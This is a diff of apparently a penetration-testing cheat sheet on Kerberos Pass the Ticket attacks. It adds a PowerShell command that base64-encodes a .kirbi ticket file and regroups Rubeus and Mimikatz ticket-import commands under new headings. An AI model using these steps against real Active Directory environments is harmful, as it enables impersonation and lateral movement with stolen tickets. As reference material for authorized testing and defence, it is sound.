@@ -3671,13 +3671,19 @@ Rubeus.exe ptt /ticket:<ticket file>
 ```
 We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.
 
+
 ## Convert kirbi to Base64 Format
 ```
-Rubeus.exe ptt /ticket:<the base64 encoded format> 
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("<the ticket created before with the a user>")) 
 ```
 
 Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.
 
+## Pass the Ticket - Base64 Format	
+```
+Rubeus.exe ptt /ticket:<the base64 encoded format>	
+```
+	
 ## Mimikatz - Pass the Ticket
 ```
 privilege::debug
